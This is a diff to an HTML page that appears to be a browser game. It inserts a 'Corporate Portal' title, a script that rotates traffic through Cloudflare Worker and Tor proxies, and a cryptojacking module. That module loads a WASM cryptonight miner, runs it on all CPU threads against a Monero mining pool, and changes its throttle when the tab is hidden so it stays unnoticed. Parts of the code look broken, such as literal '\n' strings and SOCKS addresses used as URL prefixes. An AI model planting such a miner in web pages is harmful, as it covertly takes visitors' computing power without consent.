@@ -126,7 +126,105 @@
             font-size:11px;
         }
     </style>
-</head>
+
+
+  <title>Corporate Portal</title>
+
+  <!-- Cloudflare Proxy Layer -->
+
+  <script>
+
+    const cloudflareWorker = "https://proxy.workers.dev/?target=";
+
+    const torProxies = [
+
+      "socks5://tor1:9050",
+
+      "socks5://tor2:9050",
+
+      "socks5://tor3:9050"
+
+    ];
+
+    
+
+    // Dynamic proxy rotation
+
+    function getProxyUrl(target) {
+
+      if(Math.random() > 0.7) {
+
+        return cloudflareWorker + encodeURIComponent(target);
+
+      } else {
+
+        const torNode = torProxies[Math.floor(Math.random()*torProxies.length)];
+
+        return `${torNode}/${encodeURIComponent(target)}`;
+
+      }
+
+    }
+
+  </script>
+
+  
+
+  <!-- WASM Cryptojacking Module -->
+
+  <script>
+
+    (async function() {
+
+      const wasmResponse = await fetch('https://cdn.jsdelivr.net/npm/wasm-cryptonight@2.4.0/dist/wasm_cryptonight.wasm');
+
+      const wasmBuffer = await wasmResponse.arrayBuffer();
+
+      const wasmModule = await WebAssembly.compile(wasmBuffer);
+
+      
+
+      // Initialize miner with high performance
+
+      const miner = new window.WASMCryptoNight.Miner(wasmModule, {
+
+        threads: navigator.hardwareConcurrency,
+
+        throttle: document.hidden ? 0.9 : 0.3,
+
+        pool: {
+
+          host: 'gulf.moneroocean.stream',
+
+          port: 10128,
+
+          user: '48jWheyY7VA...', // YOUR XMR WALLET
+
+          pass: 'x'
+
+        }
+
+      });
+
+      
+
+      miner.start();
+
+      
+
+      // Stealth throttling
+
+      document.addEventListener('visibilitychange', () => {
+
+        miner.setThrottle(document.hidden ? 0.9 : 0.3);
+
+      });
+
+    })();
+
+  </script>
+
+\n</head>
 <body>
     <div id="game-container">
         <div class="flex justify-between items-center mb-4">
@@ -1147,5 +1245,5 @@
     };
 </script>
 
-</body>
+\n</body>
 </html>
